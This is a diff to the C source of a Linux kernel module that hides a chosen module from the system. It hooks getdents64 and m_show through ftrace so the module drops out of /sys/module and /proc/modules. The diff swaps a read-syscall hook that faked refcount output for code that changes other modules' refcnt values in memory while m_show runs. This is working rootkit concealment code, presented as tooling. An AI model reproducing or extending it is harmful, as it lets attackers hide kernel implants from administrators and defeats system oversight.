@@ -11,9 +11,6 @@
 #include "../common/ftrace_hooking/ftrace_hook.h"
 #include "../common/waitable_counters/waitable_counter.h"
 
-static int unload_timeout_msec = 10000; /* 10 seconds */
-module_param(unload_timeout_msec, int, 0600);
-
 static char *mod_name_to_hide;
 module_param(mod_name_to_hide, charp, 0600);
 static char *sys_modules_path = "/sys/module/";
@@ -24,20 +21,21 @@ typedef int (*original_getdents64_t)(const struct pt_regs *regs);
 static struct fthook getdents64_hook;
 static char *holders_path = "/holders";
 
-// read hook
-typedef ssize_t  (*original_read_t)(const struct pt_regs *regs);
-static struct fthook read_hook;
-static char *refcount_path = "/refcnt";
-DECLARE_WAIT_QUEUE_HEAD(read_wq);
-
 // m_show hook
 typedef int (*original_m_show_t)(struct seq_file *seq, void *v);
 static struct fthook m_show_hook;
+static LIST_HEAD(used_by_hidden_list);
 #pragma endregion hook_consts
 
 #pragma region utils
+struct mod_list_entry {
+    struct module *mod;
+    struct list_head list;
+};
+
 /* Does a already use b?
-   Copied from module.c, as that function is not exported. */
+   Copied from module.c, as that function is not exported.
+   Requires module mutex */
 bool already_uses(struct module *a, struct module *b)
 {
 	struct module_use *use;
@@ -50,66 +48,32 @@ bool already_uses(struct module *a, struct module *b)
     
 	return false;
 }
-#pragma endregion utils
 
-#pragma region read_hook
-ssize_t new_read(const struct pt_regs *regs) {
-    struct task_struct *task = current;
-    bool is_rmmod = !strcmp(task->comm, "rmmod");
-    if (!is_rmmod) {
-        increment();
-    }
+/*  Gets refcnt by iterating through the target list of the module struct 
+    Requires module mutex */
+int get_actual_refcnt(struct module *a) {
+	struct module_use *use;
+    int refcnt = 1; // Module ref base is equal to 1.
 
-    original_read_t original_read_ptr = (original_read_t)read_hook.original_function_address;
-    int bytes_read = original_read_ptr(regs);
+	list_for_each_entry(use, &a->source_list, source_list) {
+        pr_info("refcnt: %s", use->source->name);
+        refcnt++;
+	}
 
-    struct file *file = fget((int)regs->di);
-    if (file == NULL) {
-        if (!is_rmmod) {
-            decrement(&read_wq);
-        }
-        return original_read_ptr(regs);
-    }
-
-    char *allocated_path_pointer = kmalloc(PATH_MAX, GFP_KERNEL);
-    char *path = d_path(&file->f_path, allocated_path_pointer, PATH_MAX);
-        
-    if ((strstr(path, sys_modules_path) != NULL) && (strstr(path, refcount_path) != NULL) && bytes_read > 0) {
-        char *current_module_name = file->f_path.dentry->d_parent->d_iname;
-
-        // This isn't intended to work on the module we're trying to hide, so we skip it.
-        if (strcmp(mod_name_to_hide, current_module_name)) {
-            mutex_lock(&module_mutex);
-            struct module *module_to_hide = find_module(mod_name_to_hide);
-            struct module *current_module = find_module(current_module_name);
-            mutex_unlock(&module_mutex);
-
-            int does_use_hidden_module = already_uses(module_to_hide, current_module);
-            if (does_use_hidden_module) {
-                pr_info("Hiding %s from %s's refcount...", module_to_hide->name, current_module->name);
-
-                int refcount = module_refcount(current_module);
-                if (refcount > 0) {
-                    int new_refcount = refcount - 1;
-
-                    void *buf_pointer = (void*)regs->si;
-                    char *new_value = kmalloc(bytes_read, GFP_KERNEL);
-                    sprintf(new_value, "%d\n", new_refcount);
-                    copy_to_user(buf_pointer, new_value, bytes_read);
-                    kfree(new_value);
-                }
-            }
-        }
-    }
-    
-    kfree(allocated_path_pointer);
-    fput(file);
-    if (!is_rmmod) {
-        decrement(&read_wq);
-    }
-    return bytes_read;
+    return refcnt + 1; 
 }
-#pragma endregion read_hook
+
+bool already_in_list(struct module *mod) {
+    struct mod_list_entry *entry;
+    list_for_each_entry(entry, &used_by_hidden_list, list) {
+        if (!strcmp(entry->mod->name, mod->name)) {
+            return true;
+        }
+    }
+
+    return false;
+}
+#pragma endregion utils
 
 #pragma region get_dents64_hook
 int new_getdents64(const struct pt_regs *regs) {
@@ -173,10 +137,26 @@ int new_getdents64(const struct pt_regs *regs) {
 int new_m_show(struct seq_file *m, void *p) {
     original_m_show_t original_m_show_ptr = (original_m_show_t)m_show_hook.original_function_address;
 
-    struct module *mod = list_entry(p, struct module, list);
-    if (!strcmp(mod->name, mod_name_to_hide)) {
-        pr_info("Hiding %s from m_show", mod->name);
+    struct module *current_module = list_entry(p, struct module, list);
+    if (!strcmp(current_module->name, mod_name_to_hide)) {
+        pr_info("Hiding %s from m_show", current_module->name);
         return 0;
+    }
+    
+    // When called, this function already has the module mutex. As such, there's no need to acquire it when using the helper functions.
+    struct module *module_to_hide = find_module(mod_name_to_hide);
+    bool is_in_use = already_uses(module_to_hide, current_module);
+
+    if (is_in_use && !already_in_list(current_module)) {
+        struct mod_list_entry *new_entry = kmalloc(sizeof(struct mod_list_entry), GFP_KERNEL);
+        new_entry->mod = current_module;
+        INIT_LIST_HEAD(&new_entry->list);
+
+        list_add_tail(&new_entry->list, &used_by_hidden_list);
+
+        int actual_refcnt = get_actual_refcnt(current_module);
+        int modified_refcnt = actual_refcnt - 1;
+        atomic_set(&current_module->refcnt, modified_refcnt);
     }
 
     return original_m_show_ptr(m, p);
@@ -200,11 +180,6 @@ int load(void) {
         return getdents_res;
     }
 
-    int read_res = setup_syscall_hook(&read_hook, __NR_read, (unsigned long)new_read);
-    if (read_res) {
-        return read_res;
-    }
-
     pr_info("Initialized successfuly!");
 
     return 0;
@@ -215,10 +190,21 @@ void unload(void) {
 
     remove_hook(&m_show_hook);
     remove_hook(&getdents64_hook);
-    remove_hook(&read_hook);
 
-    long timeout = msecs_to_jiffies(unload_timeout_msec);    
-    wait_event_timeout(read_wq, read_counter() == 0, timeout);
+    struct list_head *pos;
+    struct list_head *tmp;
+    list_for_each_safe(pos, tmp, &used_by_hidden_list) {
+        struct mod_list_entry *entry = list_entry(pos, struct mod_list_entry, list);
+
+        struct module *mod = entry->mod;
+        mutex_lock(&module_mutex);
+        int actual_refcnt = get_actual_refcnt(mod);
+        atomic_set(&mod->refcnt, actual_refcnt);
+        mutex_unlock(&module_mutex);
+
+        list_del(&entry->list);
+        kfree(entry);
+    }
 }
 
 module_init(load);
